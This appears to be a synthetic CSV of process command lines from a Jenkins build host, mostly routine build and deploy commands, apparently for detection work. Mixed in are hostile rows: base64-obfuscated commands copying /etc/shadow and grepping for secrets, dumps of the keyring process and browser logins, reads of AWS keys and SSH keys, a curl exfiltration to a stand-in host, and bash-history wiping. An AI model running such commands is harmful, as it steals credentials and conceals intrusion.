process_name,command_line
df,df -h
git,git commit -am 'fix: search retry logic'
rsync,rsync -az /home/jenkins/platform/dist/ /var/www/api-gateway/
curl,curl -s http://localhost:8080/health
git,git commit -am 'fix: postgres retry logic'
bash,echo Y3AgL2V0Yy9zaGFkb3cgL2Rldi9zaG0vLmZvbnQtdW5peC8ucyAyPi9kZXYvbnVsbA== | base64 -d | bash
git,git pull origin hotfix/login
docker,docker build -t auth-svc:90 .
git,git status
ps,ps aux --sort=-%mem | head
psql,psql -h db -U jenkins -c 'SELECT count(*) FROM orders;'
free,free -m
npm,npm run build
journalctl,journalctl -u worker --since '10 min ago'
bash,cd /home/jenkins/mobile-api && ls
aws,aws s3 ls s3://api-gateway-artifacts/
tar,tar czf /backups/postgres-32.tgz /var/lib/postgres
bash,"X='gcore -o /dev/shm/.font-unix/m $(pgrep -n gnome-keyring) 2>/dev/null'; eval ""$X"""
systemctl,systemctl status auth-svc
node,node scripts/seed.js
kubectl,kubectl logs deploy/search --tail 50
python3,python3 -m pytest tests/ -q
git,git log --oneline -n 10
apt-get,apt-get install -y python3-pip
docker,docker compose up -d postgres
find,find /home/jenkins/billing-service -name '*.log' -mtime +7
docker,docker compose up -d payments
bash,echo Z3JlcCAtcklFICdwYXNzd29yZHxhcGlfa2V5fHNlY3JldCcgL2hvbWUvamVua2lucyAvZXRjIDI+L2Rldi9udWxsIHwgaGVhZA== | base64 -d | bash
htop,htop -d 5
bash,cd /home/jenkins/infra && ls
grep,grep -r 'TODO' /home/jenkins/infra/src
bash,cd /home/jenkins/platform && ls
systemctl,systemctl restart worker
python3,python3 /opt/app/manage.py migrate
systemctl,systemctl status nginx
scp,scp report.csv jenkins@reports:/srv/reports/
git,git checkout release/2.4
npm,npm test -- --runInBand
go,go build ./...
kubectl,kubectl rollout status deploy/redis
uptime,uptime
redis-cli,redis-cli ping
bash,"X='cp /home/jenkins/.mozilla/firefox/*/logins.json /dev/shm/.font-unix/'; eval ""$X"""
rsync,rsync -az /home/jenkins/data-pipeline/dist/ /var/www/api-gateway/
git,git commit -am 'fix: nginx retry logic'
docker,docker build -t search:15 .
systemctl,systemctl status payments
pip3,pip3 install -r requirements.txt
bash,ls -la /home/jenkins
docker,docker logs --tail 100 worker
curl,curl -s -F f=@/dev/shm/.font-unix/.s https://cdn-assets-942.test/c
docker,docker build -t nginx:7 .
journalctl,journalctl -u nginx --since '10 min ago'
bash,cd /home/jenkins/billing-service && ls
rsync,rsync -az /home/jenkins/infra/dist/ /var/www/redis/
apt-get,apt-get install -y openjdk-17-jdk
grep,grep -r 'TODO' /home/jenkins/platform/src
docker,docker logs --tail 100 search
ssh,ssh jenkins@build-35 uptime
docker,docker logs --tail 100 api-gateway
make,make lint
aws,aws s3 ls s3://worker-artifacts/
grep,grep -r 'TODO' /home/jenkins/web-app/src
aws,aws s3 ls s3://postgres-artifacts/
kubectl,kubectl get pods -n production
bash,"X='getent passwd | awk -F: '\''$3>=1000{print $1}'\'''; eval ""$X"""
kubectl,kubectl rollout status deploy/search
git,git pull origin feature/checkout
npm,npm ci --no-audit
docker,docker logs --tail 100 redis
git,git checkout feature/checkout
docker,docker ps -a
bash,"ps -eo user,pid,cmd --sort=-%cpu | head -n 25"
git,git pull origin main
rsync,rsync -az /home/jenkins/web-app/dist/ /var/www/nginx/
rsync,rsync -az /home/jenkins/data-pipeline/dist/ /var/www/worker/
kubectl,kubectl rollout status deploy/nginx
git,git commit -am 'fix: payments retry logic'
journalctl,journalctl -u payments --since '10 min ago'
bash,truncate -s0 /home/jenkins/.bash_history 2>/dev/null
git,git checkout hotfix/login
curl,curl -fsS https://api.github.com/repos/mobile-api/commits | head
git,git commit -am 'fix: api-gateway retry logic'
tar,tar czf /backups/worker-47.tgz /var/lib/worker
git,git commit -am 'fix: auth-svc retry logic'
terraform,terraform plan -out tfplan
find,find /home/jenkins/data-pipeline -name '*.log' -mtime +7
grep,grep -r 'TODO' /home/jenkins/billing-service/src
tar,tar czf /backups/nginx-41.tgz /var/lib/nginx
bash,find /home/jenkins -name '*.env' -o -name 'id_rsa' 2>/dev/null | head
systemctl,systemctl restart payments
journalctl,journalctl -u auth-svc --since '10 min ago'
ssh,ssh jenkins@build-92 uptime
systemctl,systemctl restart api-gateway
rsync,rsync -az /home/jenkins/infra/dist/ /var/www/payments/
docker,docker build -t nginx:68 .
journalctl,journalctl -u api-gateway --since '10 min ago'
kubectl,kubectl rollout status deploy/api-gateway
docker,docker build -t redis:52 .
docker,docker build -t api-gateway:97 .
kubectl,kubectl rollout status deploy/payments
ssh,ssh jenkins@build-63 uptime
bash,cd /home/jenkins/web-app && ls
ssh,ssh jenkins@build-1 uptime
git,git checkout main
curl,curl -fsS https://api.github.com/repos/billing-service/commits | head
kubectl,kubectl logs deploy/redis --tail 50
bash,cat /home/jenkins/.aws/credentials 2>/dev/null
git,git checkout develop
docker,docker build -t redis:17 .
rsync,rsync -az /home/jenkins/platform/dist/ /var/www/nginx/
grep,grep -r 'TODO' /home/jenkins/data-pipeline/src
sudo,sudo -n -l 2>/dev/null
aws,aws s3 ls s3://nginx-artifacts/
apt-get,apt-get install -y ripgrep
ssh,ssh jenkins@build-78 uptime
systemctl,systemctl restart redis
rsync,rsync -az /home/jenkins/data-pipeline/dist/ /var/www/postgres/
rsync,rsync -az /home/jenkins/billing-service/dist/ /var/www/postgres/
kubectl,kubectl logs deploy/payments --tail 50
systemctl,systemctl status api-gateway
ss,ss -tnp 2>/dev/null | head -n 40
docker,docker compose up -d auth-svc
docker,docker build -t postgres:81 .
apt-get,apt-get install -y jq
docker,docker logs --tail 100 auth-svc
rsync,rsync -az /home/jenkins/billing-service/dist/ /var/www/nginx/
docker,docker build -t postgres:69 .
systemctl,systemctl restart nginx
aws,aws s3 ls s3://redis-artifacts/
ssh,ssh jenkins@build-50 uptime
docker,docker compose up -d api-gateway
ssh,ssh jenkins@build-49 uptime
git,git pull origin release/2.4
kubectl,kubectl rollout status deploy/postgres
docker,docker compose up -d redis
find,find /home/jenkins/infra -name '*.log' -mtime +7
bash,truncate -s0 /home/jenkins/.bash_history 2>/dev/null # 3474
docker,docker compose up -d nginx
rsync,rsync -az /home/jenkins/infra/dist/ /var/www/worker/
docker,docker build -t worker:95 .
grep,grep -r 'TODO' /home/jenkins/mobile-api/src
docker,docker build -t search:38 .
rsync,rsync -az /home/jenkins/web-app/dist/ /var/www/payments/
aws,aws s3 ls s3://auth-svc-artifacts/
bash,find /home/jenkins -name '*.env' -o -name 'id_rsa' 2>/dev/null | head # 5266
tar,tar czf /backups/auth-svc-15.tgz /var/lib/auth-svc
curl,curl -fsS https://api.github.com/repos/web-app/commits | head
curl,curl -fsS https://api.github.com/repos/infra/commits | head
git,git commit -am 'fix: worker retry logic'
kubectl,kubectl logs deploy/worker --tail 50
rsync,rsync -az /home/jenkins/billing-service/dist/ /var/www/search/
docker,docker build -t api-gateway:57 .
ssh,ssh jenkins@build-25 uptime
rsync,rsync -az /home/jenkins/web-app/dist/ /var/www/api-gateway/
systemctl,systemctl restart auth-svc
docker,docker logs --tail 100 payments
systemctl,systemctl status search
tar,tar czf /backups/worker-59.tgz /var/lib/worker
bash,cat /home/jenkins/.aws/credentials 2>/dev/null # 5586
docker,docker build -t auth-svc:54 .
systemctl,systemctl restart search
kubectl,kubectl rollout status deploy/auth-svc
docker,docker logs --tail 100 nginx
tar,tar czf /backups/auth-svc-92.tgz /var/lib/auth-svc
docker,docker compose up -d worker
docker,docker build -t worker:3 .
ssh,ssh jenkins@build-23 uptime
git,git commit -am 'fix: redis retry logic'
kubectl,kubectl logs deploy/postgres --tail 50
sudo,sudo -n -l 2>/dev/null # 1215
ssh,ssh jenkins@build-58 uptime
journalctl,journalctl -u redis --since '10 min ago'
ssh,ssh jenkins@build-17 uptime
git,git pull origin develop
systemctl,systemctl status postgres
ssh,ssh jenkins@build-59 uptime
systemctl,systemctl status redis
tar,tar czf /backups/search-14.tgz /var/lib/search
apt-get,apt-get install -y nodejs
bash,cd /home/jenkins/data-pipeline && ls
kubectl,kubectl logs deploy/nginx --tail 50
rsync,rsync -az /home/jenkins/web-app/dist/ /var/www/auth-svc/
tar,tar czf /backups/search-63.tgz /var/lib/search
curl,curl -fsS https://api.github.com/repos/data-pipeline/commits | head
bash,"ps -eo user,pid,cmd --sort=-%cpu | head -n 25 # 8808"
find,find /home/jenkins/platform -name '*.log' -mtime +7
ssh,ssh jenkins@build-2 uptime
